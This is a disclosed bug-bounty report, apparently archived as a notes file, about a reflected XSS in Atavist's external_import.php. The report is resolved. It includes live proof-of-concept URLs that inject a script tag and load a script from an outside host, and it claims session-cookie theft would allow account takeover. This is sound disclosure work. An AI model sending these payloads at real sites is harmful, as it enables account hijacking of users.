---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
  - stack/php
  - vuln/xss-reflected
  - vuln/xss
  - impact/account-takeover
  - trigger/session-cookie
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
body: true
date: 2020-11-18
submitted: 2020-09-08T10:12:34.981Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "bugra"
source: "https://hackerone.com/reports/976657"
title: "Reflected XSS on a Atavist theme at external_import.php"
---
# Reflected XSS on a Atavist theme at external_import.php

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** Automattic | **Disclosed:** 2020-11-18

- Report: [https://hackerone.com/reports/976657](https://hackerone.com/reports/976657)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2020-09-08T10:12:34.981Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hi team,
I found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called `scripts` on this php file. 
Basically, the endpoint prints value of `scripts` parameter to `<script src='$Value'>`.
So we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs
Or we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

This endpoint is also available on other websites. Like :
https://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

Also there is no secure flag on the session cookie (`periodicSessionatavist`). So this XSS leads to account takeover.

## Impact

Reflected XSS - account takeover via cookie stealing

Thanks,
Bugra

## Timeline

- **Report Filed**
- **2020-09-09** @xknown: Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.
- **2020-09-09** @xknown: Hi @bugra, we deployed a fix for this issue. Can you please test to see if you are able to bypass it? Thanks
- **Report Triaged**
- **2020-09-09** @bugra: Hi @xknown, I can confirm the fix. The `scripts` parameter doesn't work anymore. You can close the report as Resolved.
- **Report Resolved**
- **Bounty Awarded**
- **2020-09-16** @bugra: Thanks!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
